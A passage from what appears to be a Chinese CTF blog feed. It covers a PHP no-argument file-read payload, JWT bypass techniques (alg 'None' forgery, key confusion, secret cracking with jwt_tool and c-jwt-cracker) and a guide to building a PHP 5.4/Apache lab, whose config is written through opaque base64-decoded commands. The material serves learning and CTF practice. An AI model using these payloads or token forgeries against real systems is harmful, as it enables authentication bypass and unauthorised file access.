class="hljs-string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|readline/i&#x27;</span>, <span class="hljs-variable">$vul</span>))&#123;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">getFucntionParameter1</span>(<span class="hljs-variable">$vul</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要使用了反射检测函数的参数。</p><p><strong>payload</strong></p><ul><li><p><code>crypt</code>函数的返回值最后一位可能为<code>.</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>())))))))))<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>()))))))));<br></code></pre></td></tr></table></figure></li><li><p><code>localeconv</code>函数</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JWT认证绕过</title>
    <link href="/2024/08/31/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/"/>
    <url>/2024/08/31/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/</url>
    
    <content type="html"><![CDATA[<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>jwt是一个轻量级的认证规范 对数据进行签名用的</p><p>防止数据被篡改</p><ol><li>对数据进行加密   内容对用户敏感，不需要对外</li><li>对数据进行签名   内容不敏感，但是确保不被篡改</li></ol><p>JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取<br>JSON Web Token (JWT)<br>?username&#x3D;admin&amp;score&#x3D;100  别人传递过程中，会对积分进行篡改<br>?username&#x3D;admin&amp;score&#x3D;100&amp;token&#x3D;c17961f5f372f8cf039113909d715943<br>? md5(score&#x3D;100&amp;username&#x3D;admin)&#x3D;c17961f5f372f8cf039113909d715943<br>?score&#x3D;100&amp;username&#x3D;admin&amp;token&#x3D;c17961ff372f8cf039113909d715943<br>篡改数据的同时，破解了算法，篡改了签名<br>加盐机制，salt<br>md5(score&#x3D;100&amp;username&#x3D;admin_ctfshow)&#x3D;20f3fa445b286df3f1a518fcbcd8bbe2</p><p>盐值有可能被爆破，也有可能被泄露<br>增加更高的密码算法，不再简单的md5，盐值也大幅度提高长度，达到几百上千位 来保证我们的数据不被篡改  或者即使篡改了我们能发现<br>由 Header、Payload、Signature 三部分构成，用点分隔，数据采用Base64URL进行编码</p><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>Header是JWT的第一个部分，是一个 JSON 对象，主要声明了JWT的签名算法，如“HS256”、“RS256”等，以及其他可选参数，如“kid”等。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h2><p>Signature 是对 Header 和 Payload 进行签名，具体是用什么加密方式写在 Header 的 alg 中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。Signature的功能是保护token完整性。</p><p>生成方法为将 header 和 payload 两个部分联结起来，然后通过 header 部分指定的算法，计算出签名。抽象成公式就是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">signature = HMAC-SHA256(base64urlEncode(header) + <span class="hljs-string">&#x27;.&#x27;</span> + base64urlEncode(payload), secret_key)<br></code></pre></td></tr></table></figure><p>值得注意的是，编码 header 和 payload 时使用的编码方式为 base64urlencode，base64url 编码是 base64 的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”&#x3D;”号，并将标准 Base64 中的 “+” 和 “&#x2F;“ 分别改成了 “-“ 和 “_”。</p><h2 id="JWT生成-在线网址-工具"><a href="#JWT生成-在线网址-工具" class="headerlink" title="JWT生成-在线网址&amp;工具"></a>JWT生成-在线网址&amp;工具</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;secret_key&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;admin&quot;:True,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ol><li>当不校验算法时，我们可以替换算法，甚至可以使用空的算法，来达到数据篡改目的：</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;JWT&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;iss&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673710291</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;nbf&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jti&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;21a3d6eec9efbc030983fbc3650c0f03&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ewogICAgImFsZyIgOiAiTm9uZSIsCiAgICAidHlwIiA6ICJqd3QiCn0=.ewogICAgInVzZXIiIDogImFkbWluIgp9<br></code></pre></td></tr></table></figure><h2 id="JWT-爆破工具地址"><a href="#JWT-爆破工具地址" class="headerlink" title="JWT 爆破工具地址"></a>JWT 爆破工具地址</h2><p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build . -t jwtcrack<br>docker run -it --<span class="hljs-built_in">rm</span>  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE<br></code></pre></td></tr></table></figure><h2 id="密钥混淆攻击"><a href="#密钥混淆攻击" class="headerlink" title="密钥混淆攻击"></a>密钥混淆攻击</h2><p>JWT最常用的两种算法是HMAC和RSA。HMAC用同一个密钥对token进行签名和认证。而RSA需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证。那么，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改 header 中算法为HS256，然后使用RSA公钥对数据进行签名。</p><p>利用方式：<a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 jwt_tool.py token_here -pk pubkey -T -S hs256<br></code></pre></td></tr></table></figure><h2 id="密钥爆破-泄露"><a href="#密钥爆破-泄露" class="headerlink" title="密钥爆破&#x2F;泄露"></a>密钥爆破&#x2F;泄露</h2><p>HMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。</p><p>因此，jwtcrack破解是JWT破解工具，可以通过穷举的方式暴力破解密钥。如果可以破解HMAC密钥，则可以伪造令牌中的任何内容，这个漏洞将会给系统带来非常严重的后果，所以在加密时不要使用弱密钥进行加密。</p><p><a href="https://github.com/brendan-rius/c-jwt-cracker">jwtcrack</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./jwtcrack token_here<br></code></pre></td></tr></table></figure><h2 id="node安装jwt命令"><a href="#node安装jwt命令" class="headerlink" title="node安装jwt命令"></a>node安装jwt命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install jsonwebtoken<br></code></pre></td></tr></table></figure><h3 id="1-私钥泄露"><a href="#1-私钥泄露" class="headerlink" title="1. 私钥泄露"></a>1. 私钥泄露</h3><p>可以根据私钥生成任意的jwt字符串：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token);<br></code></pre></td></tr></table></figure><h3 id="2-公钥泄露"><a href="#2-公钥泄露" class="headerlink" title="2. 公钥泄露"></a>2. 公钥泄露</h3><p>可以根据公钥，修改算法从非对称算法到对称密钥算法。双方都使用公钥验签，顺利篡改数据。当公钥可以拿到时，如果使用对称密码，则对面使用相同的公钥进行解密，实现验签通过。</p><h2 id="总结加密方式"><a href="#总结加密方式" class="headerlink" title="总结加密方式"></a>总结加密方式</h2><ol><li><p><strong>非对称加密算法</strong>：私钥、公钥。只要两个时匹配，一个私钥加密的文件，用公钥都能解开(验签)。</p></li><li><p><strong>对称加密算法</strong>：暗号、口令、公钥。</p></li></ol><h2 id="总结jwt攻击"><a href="#总结jwt攻击" class="headerlink" title="总结jwt攻击"></a>总结jwt攻击</h2><ol><li>空密码算法绕过：不验证算法的前提下。</li><li>弱密码绕过：猜测弱密码。</li><li>密码爆破：安装docker，执行jwtcracker。</li><li>私钥泄露：直接利用私钥生成正确jwt字符串，过验签。</li><li>公钥泄露：不验证算法前提下，修改算法为对称加密，通过公钥重新生成对称签名的字符串，实现验签通过。</li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>JWT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>认证绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>源码编译安装php和apache</title>
    <link href="/2024/08/31/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85php%E5%92%8Capache/"/>
    <url>/2024/08/31/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85php%E5%92%8Capache/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现一个漏洞，需要 php5.4 的 lamp 环境，但网上没有找到很好的环境，所以自己搭建了一个。</p><h1 id="编译安装PHP"><a href="#编译安装PHP" class="headerlink" title="编译安装PHP"></a>编译安装PHP</h1><h2 id="前置环境配置"><a href="#前置环境配置" class="headerlink" title="前置环境配置"></a>前置环境配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装docker</span><br>apt-get install docker.io<br><span class="hljs-comment"># pull ubuntu:16.04</span><br>docker pull ubuntu:16.04<br><span class="hljs-comment"># 启动容器</span><br>docker run -it -p8888:8888 ubuntu:16.04 /bin/bash<br><span class="hljs-comment">#更换源</span><br><span class="hljs-built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.bak<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;IyMgTm90ZSwgdGhpcyBmaWxlIGlzIHdyaXR0ZW4gYnkgY2xvdWQtaW5pdCBvbiBmaXJzdCBib290IG9mIGFuIGluc3RhbmNlDQojIyBtb2RpZmljYXRpb25zIG1hZGUgaGVyZSB3aWxsIG5vdCBzdXJ2aXZlIGEgcmUtYnVuZGxlLg0KIyMgaWYgeW91IHdpc2ggdG8gbWFrZSBjaGFuZ2VzIHlvdSBjYW46DQojIyBhLikgYWRkICdhcHRfcHJlc2VydmVfc291cmNlc19saXN0OiB0cnVlJyB0byAvZXRjL2Nsb3VkL2Nsb3VkLmNmZw0KIyMgICAgIG9yIGRvIHRoZSBzYW1lIGluIHVzZXItZGF0YQ0KIyMgYi4pIGFkZCBzb3VyY2VzIGluIC9ldGMvYXB0L3NvdXJjZXMubGlzdC5kDQojIyBjLikgbWFrZSBjaGFuZ2VzIHRvIHRlbXBsYXRlIGZpbGUgL2V0Yy9jbG91ZC90ZW1wbGF0ZXMvc291cmNlcy5saXN0LnRtcGwNCg0KIyBTZWUgaHR0cDovL2hlbHAudWJ1bnR1LmNvbS9jb21tdW5pdHkvVXBncmFkZU5vdGVzIGZvciBob3cgdG8gdXBncmFkZSB0bw0KIyBuZXdlciB2ZXJzaW9ucyBvZiB0aGUgZGlzdHJpYnV0aW9uLg0KZGViIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbCBtYWluDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbCBtYWluDQoNCiMjIE1ham9yIGJ1ZyBmaXggdXBkYXRlcyBwcm9kdWNlZCBhZnRlciB0aGUgZmluYWwgcmVsZWFzZSBvZiB0aGUNCiMjIGRpc3RyaWJ1dGlvbi4NCmRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtdXBkYXRlcyBtYWluDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC11cGRhdGVzIG1haW4NCg0KIyMgTi5CLiBzb2Z0d2FyZSBmcm9tIHRoaXMgcmVwb3NpdG9yeSBpcyBFTlRJUkVMWSBVTlNVUFBPUlRFRCBieSB0aGUgVWJ1bnR1DQojIyB0ZWFtLiBBbHNvLCBwbGVhc2Ugbm90ZSB0aGF0IHNvZnR3YXJlIGluIHVuaXZlcnNlIFdJTEwgTk9UIHJlY2VpdmUgYW55DQojIyByZXZpZXcgb3IgdXBkYXRlcyBmcm9tIHRoZSBVYnVudHUgc2VjdXJpdHkgdGVhbS4NCmRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwgdW5pdmVyc2UNCmRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsIHVuaXZlcnNlDQpkZWIgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXVwZGF0ZXMgdW5pdmVyc2UNCmRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXVwZGF0ZXMgdW5pdmVyc2UNCg0KIyMgTi5CLiBzb2Z0d2FyZSBmcm9tIHRoaXMgcmVwb3NpdG9yeSBpcyBFTlRJUkVMWSBVTlNVUFBPUlRFRCBieSB0aGUgVWJ1bnR1IA0KIyMgdGVhbSwgYW5kIG1heSBub3QgYmUgdW5kZXIgYSBmcmVlIGxpY2VuY2UuIFBsZWFzZSBzYXRpc2Z5IHlvdXJzZWxmIGFzIHRvDQojIyB5b3VyIHJpZ2h0cyB0byB1c2UgdGhlIHNvZnR3YXJlLiBBbHNvLCBwbGVhc2Ugbm90ZSB0aGF0IHNvZnR3YXJlIGluIA0KIyMgbXVsdGl2ZXJzZSBXSUxMIE5PVCByZWNlaXZlIGFueSByZXZpZXcgb3IgdXBkYXRlcyBmcm9tIHRoZSBVYnVudHUNCiMjIHNlY3VyaXR5IHRlYW0uDQojIGRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwgbXVsdGl2ZXJzZQ0KIyBkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbCBtdWx0aXZlcnNlDQojIGRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtdXBkYXRlcyBtdWx0aXZlcnNlDQojIGRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXVwZGF0ZXMgbXVsdGl2ZXJzZQ0KDQojIyBVbmNvbW1lbnQgdGhlIGZvbGxvd2luZyB0d28gbGluZXMgdG8gYWRkIHNvZnR3YXJlIGZyb20gdGhlICdiYWNrcG9ydHMnDQojIyByZXBvc2l0b3J5Lg0KIyMgTi5CLiBzb2Z0d2FyZSBmcm9tIHRoaXMgcmVwb3NpdG9yeSBtYXkgbm90IGhhdmUgYmVlbiB0ZXN0ZWQgYXMNCiMjIGV4dGVuc2l2ZWx5IGFzIHRoYXQgY29udGFpbmVkIGluIHRoZSBtYWluIHJlbGVhc2UsIGFsdGhvdWdoIGl0IGluY2x1ZGVzDQojIyBuZXdlciB2ZXJzaW9ucyBvZiBzb21lIGFwcGxpY2F0aW9ucyB3aGljaCBtYXkgcHJvdmlkZSB1c2VmdWwgZmVhdHVyZXMuDQojIyBBbHNvLCBwbGVhc2Ugbm90ZSB0aGF0IHNvZnR3YXJlIGluIGJhY2twb3J0cyBXSUxMIE5PVCByZWNlaXZlIGFueSByZXZpZXcNCiMjIG9yIHVwZGF0ZXMgZnJvbSB0aGUgVWJ1bnR1IHNlY3VyaXR5IHRlYW0uDQojIGRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtYmFja3BvcnRzIG1haW4gcmVzdHJpY3RlZCB1bml2ZXJzZSBtdWx0aXZlcnNlDQojIGRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLWJhY2twb3J0cyBtYWluIHJlc3RyaWN0ZWQgdW5pdmVyc2UgbXVsdGl2ZXJzZQ0KDQojIyBVbmNvbW1lbnQgdGhlIGZvbGxvd2luZyB0d28gbGluZXMgdG8gYWRkIHNvZnR3YXJlIGZyb20gQ2Fub25pY2FsJ3MNCiMjICdwYXJ0bmVyJyByZXBvc2l0b3J5Lg0KIyMgVGhpcyBzb2Z0d2FyZSBpcyBub3QgcGFydCBvZiBVYnVudHUsIGJ1dCBpcyBvZmZlcmVkIGJ5IENhbm9uaWNhbCBhbmQgdGhlDQojIyByZXNwZWN0aXZlIHZlbmRvcnMgYXMgYSBzZXJ2aWNlIHRvIFVidW50dSB1c2Vycy4NCiMgZGViIGh0dHA6Ly9hcmNoaXZlLmNhbm9uaWNhbC5jb20vdWJ1bnR1IHhlbmlhbCBwYXJ0bmVyDQojIGRlYi1zcmMgaHR0cDovL2FyY2hpdmUuY2Fub25pY2FsLmNvbS91YnVudHUgeGVuaWFsIHBhcnRuZXINCg0KZGViIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC1zZWN1cml0eSBtYWluDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC1zZWN1cml0eSBtYWluDQpkZWIgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXNlY3VyaXR5IHVuaXZlcnNlDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC1zZWN1cml0eSB1bml2ZXJzZQ0KIyBkZWIgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXNlY3VyaXR5IG11bHRpdmVyc2UNCiMgZGViLXNyYyBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtc2VjdXJpdHkgbXVsdGl2ZXJzZQ==&quot;</span>|<span class="hljs-built_in">base64</span> -d &gt; /etc/apt/sources.list<br><br><span class="hljs-comment"># 安装必要环境</span><br>apt-get install vim wget net-tools curl<br><br><span class="hljs-comment"># 安装编译php需要的环境 eg:https://github.com/php/php-src#building-php-source-code</span><br><span class="hljs-comment"># 安装apache2-dev是因为php只能在编译时载入apache模块，所以我们需要--with-apxs2参数</span><br>apt install -y pkg-config build-essential autoconf bison re2c libxml2-dev libsqlite3-dev apache2 apache2-dev<br></code></pre></td></tr></table></figure><h2 id="下载并编译安装php"><a href="#下载并编译安装php" class="headerlink" title="下载并编译安装php"></a>下载并编译安装php</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#下载解压php-5.4.45 eg: https://www.php.net/releases/</span><br><span class="hljs-built_in">cd</span> /root<br>wget https://www.php.net/distributions/php-5.4.45.tar.bz2<br>tar jxvf php-5.4.45.tar.bz2<br><br><span class="hljs-comment"># 编译php-5.4.45  参数可通过 ./configure -h 查看</span><br><span class="hljs-built_in">cd</span> php-5.4.45<br>./buildconf --force<br>./configure --prefix=/home/php/php5445 --exec-prefix=/home/php/php5445/execdir --with-apxs2<br>make<br>make install<br><span class="hljs-comment"># 下面这个命令是make install 后提示的命令，不知道具体是什么作用</span><br>/usr/share/apr-1.0/build/libtool --finish /root/php-5.4.45/libs<br><span class="hljs-comment"># 创建 php.ini 文件</span><br><span class="hljs-built_in">mv</span> /root/php-5.4.45/php.ini-development /home/php/php5445/execdir/lib/php.ini<br><span class="hljs-comment"># 配置环境变了</span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&quot;/home/php/php5445/execdir/bin/:<span class="hljs-variable">$PATH</span>&quot;</span> &gt;&gt; ~/.bashrc<br><span class="hljs-comment"># 刷新环境</span><br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><ul><li>安装目录在 <code>/home/php/php5445</code></li><li>执行文件目录在 <code>/home/php/php5445/execdir/bin</code></li></ul><p>由于我们并没有附带任何其他参数，执行的是 PHP 的默认安装，所以只安装了如下模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Core ctype <span class="hljs-built_in">date</span> dom ereg fileinfo filter <span class="hljs-built_in">hash</span> iconv json libxml pcre PDO pdo_sqlite Phar posix Reflection session SimpleXML SPL sqlite3 standard tokenizer xml xmlreader xmlwriter<br></code></pre></td></tr></table></figure><ol start="3"><li>我们使用默认配置编译php，如果需要安装其他扩展，可能需要如下库。（下文我们会示例介绍如何编译安装mysql扩展）</li></ol><h2 id="如何编译其他模块"><a href="#如何编译其他模块" class="headerlink" title="如何编译其他模块"></a>如何编译其他模块</h2><p>对于日常可能用的模块，我们需要先下载如下库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install zlib1g-dev libbz2-dev libcurl4-openssl-dev openssl libssl-dev libpng-dev libjpeg-dev libmcrypt-dev libedit-dev libreadline-dev libmysqlclient-dev<br></code></pre></td></tr></table></figure><ul><li><code>libedit-dev libreadline-dev</code> 是 <code>php -a</code> 也就是 php 交互模式需要的库 (readline 模块)</li></ul><p>我会在下文示例编译安装 pdo_mysql 库，其他库的安装大同小异。</p><h1 id="配合apache2"><a href="#配合apache2" class="headerlink" title="配合apache2"></a>配合apache2</h1><h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更换监听端口</span><br>sed -i <span class="hljs-string">&#x27;s|Listen 80|Listen 8888|&#x27;</span> /etc/apache2/ports.conf<br><span class="hljs-comment">#设置php文件处理模块</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;U2VydmVyTmFtZSBsb2NhbGhvc3QKCjxGaWxlc01hdGNoIFwucGhwJD4KICAgIFNldEhhbmRsZXIgYXBwbGljYXRpb24veC1odHRwZC1waHAKPC9GaWxlc01hdGNoPg==&#x27;</span> | <span class="hljs-built_in">base64</span> -d &gt;&gt; /etc/apache2/apache2.conf<br><br><span class="hljs-comment"># 因为我们编译的php是线程不安全型，所以需要设置一下apache</span><br>a2dismod mpm_event<br>a2enmod mpm_prefork<br><br><span class="hljs-comment">#重启apache2</span><br>service apache2 restart<br></code></pre></td></tr></table></figure><p>访问 <code>http://ip:8888</code>  成功运行<img src="/../img/1.png"></p><h1 id="配合Mysql"><a 